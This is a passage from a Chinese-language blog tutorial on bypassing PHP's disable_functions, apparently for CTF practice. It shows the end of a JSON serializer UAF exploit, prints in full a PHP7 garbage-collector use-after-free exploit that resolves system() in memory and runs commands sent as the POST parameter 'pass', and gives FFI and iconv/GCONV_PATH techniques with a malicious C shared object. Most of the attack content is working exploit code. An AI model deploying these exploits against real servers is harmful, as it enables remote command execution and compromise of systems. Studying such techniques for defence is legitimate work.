hashtable offsetGet bucket</span><br><span class="line">        $fake_bkt_off = 0x70 * 5 - 16;</span><br><span class="line"></span><br><span class="line">        $function_data = $this-&gt;str2ptr($this-&gt;abc, 0x50);</span><br><span class="line">        for($i = 0; $i &lt; 4; $i++) {</span><br><span class="line">            $this-&gt;write($this-&gt;abc, $fake_bkt_off + $i * 8, </span><br><span class="line">                $this-&gt;leak2($function_data + 0x40 * 4, $i * 8));</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        # create a fake bucket</span><br><span class="line">        $fake_bkt_addr = $abc_addr + $fake_bkt_off;</span><br><span class="line">        $this-&gt;write($this-&gt;abc, 0x50, $fake_bkt_addr);</span><br><span class="line">        for($i = 0; $i &lt; 3; $i++) {</span><br><span class="line">            $this-&gt;write($this-&gt;abc, 0x58 + $i * 4, 1, 4);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        # copy bucket zval</span><br><span class="line">        $function_zval = $this-&gt;str2ptr($this-&gt;abc, $fake_bkt_off);</span><br><span class="line">        for($i = 0; $i &lt; 12; $i++) {</span><br><span class="line">            $this-&gt;write($this-&gt;abc,  $fake_bkt_off + 0x70 + $i * 8, </span><br><span class="line">                $this-&gt;leak2($function_zval, $i * 8));</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        # pwn</span><br><span class="line">        $this-&gt;write($this-&gt;abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);</span><br><span class="line">        $this-&gt;write($this-&gt;abc, $fake_bkt_off, $fake_bkt_addr + 0x70);</span><br><span class="line"></span><br><span class="line">        $spl1-&gt;offsetGet($cmd);</span><br><span class="line"></span><br><span class="line">        exit();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$y = [new Z()];</span><br><span class="line">json_encode([&amp;$y]);</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/Snipaste_2025-05-06_18-16-17.png"></p>
<p>上传文件</p>
<p>然后post传参pass就能执行命令了</p>
<p><img src="/images/Snipaste_2025-05-06_18-17-20.png"></p>
<p><strong>蚁剑自带插件</strong></p>
<p>这个没啥好说的，直接绕</p>
<p><img src="/images/Snipaste_2025-05-06_18-18-46.png"></p>
<h5 id="GC-with-Certain-Destructors-UAF"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#GC-with-Certain-Destructors-UAF" class="headerlink" title="GC with Certain Destructors UAF"></a>GC with Certain Destructors UAF</h5><p>关于uaf的利用涉及到底层了，这就不是我所了解的了，老老实实当脚本小子了</p>
<p><strong>手工</strong></p>
<p>exp地址</p>
<p>exploits/php7-gc-bypass at master · mm0r1/exploits (github.com)</p>
<p>上传exp</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># Author: https://github.com/mm0r1</span><br><span class="line"></span><br><span class="line">pwn($_POST["pass"]);</span><br><span class="line"></span><br><span class="line">function pwn($cmd) {</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln {</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() { </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace(); # ;)</span><br><span class="line">            if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    class Helper {</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) {</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) {</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        }</span><br><span class="line">        return $address;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) {</span><br><span class="line">        $out = "";</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) {</span><br><span class="line">            $out .= chr($ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        }</span><br><span class="line">        return $out;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) {</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) {</span><br><span class="line">            $str[$p + $i] = chr($v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) {</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }</span><br><span class="line">        return $leak;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) {</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) {</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) {</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) {</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # 'constant' constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            } else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # 'bin2hex' constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            } else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) {</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) {</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) { # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) {</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do {</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) { # system</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            }</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        } while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    function trigger_uaf($arg) {</span><br><span class="line">        # str_shuffle prevents opcache string interning</span><br><span class="line">        $arg = str_shuffle(str_repeat('A', 79));</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, 'WIN')) {</span><br><span class="line">        die('This PoC is for *nix systems only.');</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; # increase this value if UAF fails</span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(str_repeat('A', 79));</span><br><span class="line"></span><br><span class="line">    trigger_uaf('x');</span><br><span class="line">    $abc = $backtrace[1]['args'][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) { };</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) {</span><br><span class="line">        die("UAF failed");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    # leaks</span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    # fake value</span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    # fake reference</span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) {</span><br><span class="line">        die("Couldn't determine binary base address");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) {</span><br><span class="line">        die("Couldn't parse ELF header");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) {</span><br><span class="line">        die("Couldn't get basic_functions address");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) {</span><br><span class="line">        die("Couldn't get zif_system address");</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    # fake closure object</span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) {</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    # pwn</span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>post传参pass就可以了</p>
<p><img src="/images/Snipaste_2025-05-06_19-06-54.png"></p>
<p><strong>蚁剑</strong></p>
<p>老样子，用插件，没什么好说的</p>
<p><img src="/images/Snipaste_2025-05-06_19-08-22.png"></p>
<h5 id="FFI-扩展执行命令"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#FFI-扩展执行命令" class="headerlink" title="FFI 扩展执行命令"></a>FFI 扩展执行命令</h5><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFI 扩展已经通过RFC, 正式成为PHP7.4的捆绑扩展库, FFI 扩展允许 PHP 执行嵌入式 C 代码。</span><br></pre></td></tr></tbody></table></figure>

<p>简单来说</p>
<p>FFI提供了高级语言直接的互相调用，而对于PHP来说，FFI让我们可以方便的调用C语言写的各种库</p>
<p>传统的方式，当我们需要用一些已有的C语言的库的能力的时候，我们需要用C语言写wrapper，把他们包装成扩展，这个过程中就需要大家去学习PHP的扩展怎么写，当然现在也有一些方便的方式，比如Zephir. 但总还是有一些学习成本的，而有了FFI以后，我们就可以直接在PHP脚本中调用C语言写的库中的函数了。</p>
<p>而C语言几十年的历史中，积累了大量的优秀的库，FFI直接让我们可以方便的享受这个庞大的资源了。</p>
<p><strong>手工</strong></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># 创建了一个新的FFI（Foreign Function Interface）对象，并使用cdef方法定义了一个C语言的函数system。这个函数接受一个字符指针参数，并返回一个整数。在C语言中，system函数通常用于执行shell命令。</span><br><span class="line">$ffi = FFI::cdef("int system(const char *command);");</span><br><span class="line"># 调用了上面定义的system函数，传递了一个字符串参数"tac /flag &gt; /tmp/123"。这个字符串是一个shell命令，它的功能是读取名为flag的文件（通常位于Web服务器的文档根目录），并将其内容以反向顺序写入</span><br><span class="line">$ffi-&gt;system("tac /flag &gt; /tmp/123");</span><br><span class="line"># 使用PHP的file_get_contents函数读取/tmp/123文件的内容，并将其输出到屏幕上。</span><br><span class="line">echo file_get_contents("/tmp/123");</span><br><span class="line"># 最后，这行代码使用PHP的unlink函数删除/tmp/123文件。使用@符号是为了抑制可能出现的错误消息。</span><br><span class="line">@unlink("/tmp/123");</span><br></pre></td></tr></tbody></table></figure>

<p>上传之后访问页面</p>
<p><img src="/images/Snipaste_2025-05-06_19-35-40.png"></p>
<p><strong>蚁剑</strong></p>
<p>没什么好说的，直接用插件就行了</p>
<h5 id="iconv执行命令"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#iconv执行命令" class="headerlink" title="iconv执行命令"></a>iconv执行命令</h5><p>php在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做iconv_open()。</p>
<p>php的iconv函数的第一个参数是字符集的名字，这个参数也会传递到glibc的iconv_open函数的参数中。</p>
<p>下面我们来看一下iconv_open函数的执行过程：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iconv_open函数首先会找到系统提供的gconv-modules文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置。</span><br><span class="line">然后再根据gconv-modules文件的指示去链接参数对应的.so文件。</span><br><span class="line">之后会调用.so文件中的gconv()与gonv_init()函数。</span><br><span class="line">然后就是一些与本漏洞利用无关的步骤。</span><br></pre></td></tr></tbody></table></figure>


<p>linux系统提供了一个环境变量：GCONV_PATH，该环境变量能够使glibc使用用户自定义的gconv-modules文件，因此，如果指定了GCONV_PATH的值，iconv_open函数的执行过程会如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iconv_open函数依照GCONV_PATH找到gconv-modules文件。</span><br><span class="line">根据gconv-modules文件的指示找到参数对应的.so文件。</span><br><span class="line">调用.so文件中的gconv()和gonv_init()函数。</span><br><span class="line">一些其他步骤。</span><br></pre></td></tr></tbody></table></figure>

<p>首先上传gconv-modules文件于/tmp文件夹，其格式如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  自定义字符集名字（大写）//    INTERNAL    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span><br><span class="line">module  INTERNAL    自定义字符集名字（大写）//    ../../../../../../../../tmp/自定义字符集名字（小写）    2</span><br></pre></td></tr></tbody></table></figure>


<p>我是写成</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  HACK//    INTERNAL    ../../../../../../../../tmp/hack    2</span><br><span class="line">module  INTERNAL    HACK//    ../../../../../../../../tmp/hack    2</span><br></pre></td></tr></tbody></table></figure>


<p>再书写hack.c文件:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void gconv() {}</span><br><span class="line"></span><br><span class="line">void gconv_init() {</span><br><span class="line">  system("/readflag &gt; /tmp/flag");</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>编译成.so文件</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hack.c -o hack.so -shared -fPIC</span><br></pre></td></tr></tbody></table></figure>


<p>将生成的.so文件上传到/tmp。</p>
<p>再上传shell.php</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    putenv("GCONV_PATH=/tmp/");</span><br><span class="line">    iconv("hack", "UTF-8", "whatever");</span><br><span class="line">?&gt;</span><br></pre></td></tr></tbody></table></figure>


<p>访问shell.php就能看到/tmp文件夹下有flag了</p>
<p><strong>蚁剑</strong></p>
<p>蚁剑还是太超标了</p>
<h3 id="总结"><a href="/2025/04/25/%E7%BB%95%E8%BF%87disable-function%E7%9A%84%E9%99%90%E5%88%B6/#总结" class="headerlink" title="总结"></a>总结</h3><p>实在是懒得手动就直接蚁剑解决了吧，但是手动也能学到一些东西</p>
</body></html>
    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/web/" rel="tag"># web</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2025/04/24/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-9day/" rel="prev" title="深度学习-9day">
      <i class="fa fa-chevron-left"></i> 深度学习-9day
    </a></div>
      <div class="post-nav-item">
    <a href="/2025/05/08/ThinkPhp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="ThinkPhp框架反序列化">
      ThinkPhp框架反序列化 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87Disable-Function%E7%9A%84%E9%99%90%E5%88%B6"><span class="nav-number">1.</span> <span class="nav-text">绕过Disable_Function的限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5"><span class="nav-number">1.0.1.</span> <span class="nav-text">概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.2.</span> <span class="nav-text">常规绕过(黑名单绕过)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">1.0.3.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-LD-PRELOAD-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">1.0.3.0.1.</span> <span class="nav-text">利用 LD_PRELOAD 环境变量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8shellshock"><span class="nav-number">1.0.3.0.2.</span> <span class="nav-text">利用shellshock</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-Apache-Mod-CGI"><span class="nav-number">1.0.3.0.3.</span> <span class="nav-text">利用 Apache Mod CGI</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PHP-FPM-%E5%88%A9%E7%94%A8-LD-PRELOAD"><span class="nav-number">1.0.3.0.4.</span> <span class="nav-text">PHP-FPM 利用 LD_PRELOAD</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Json-Serizlizer-UAF"><span class="nav-number">1.0.3.0.5.</span> <span class="nav-text">Json Serizlizer UAF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#GC-with-Certain-Destructors-UAF"><span class="nav-number">1.0.3.0.6.</span> <span class="nav-text">GC with Certain Destructors UAF</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#FFI-%E6%89%A9%E5%B1%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.0.3.0.7.</span> <span class="nav-text">FFI 扩展执行命令</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#iconv%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">1.0.3.0.8.</span> <span class="nav-text">iconv执行命令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.0.4.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Cnext</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/admintor889" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;admintor889" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Cnext</span>
</div>

<!--
